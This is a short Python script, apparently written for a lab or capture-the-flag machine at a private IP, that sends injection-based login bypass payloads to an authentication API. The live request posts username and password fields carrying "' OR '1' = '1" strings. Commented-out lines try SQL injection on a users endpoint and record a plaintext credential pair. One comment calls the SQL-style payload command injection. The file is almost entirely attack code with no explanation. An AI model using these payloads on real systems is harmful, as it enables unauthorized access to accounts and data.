import requests
import urllib.parse

TARGET = 'http://10.10.10.58:3000'

s = requests.session()

# data = {"username":"tom","password":"spongebob"}
# data = {"username":"tom","password":"spongebob"}
# r = s.post(TARGET + '/api/session/authenticate', json=data)
# print(r.text)
# print('-'*80)

# Command injection
data = {
    "username": "tom' OR '1' = '1",
    "password": "a' OR '1' = '1"
}
r = s.post(TARGET + '/api/session/authenticate', json=data)
print(r.text)

# SQL injection
# payload = urllib.parse.quote_plus("tom' OR '1' = '1")
# print(payload)
# r = s.get(TARGET + '/api/users/' + payload)
# print(r.text)
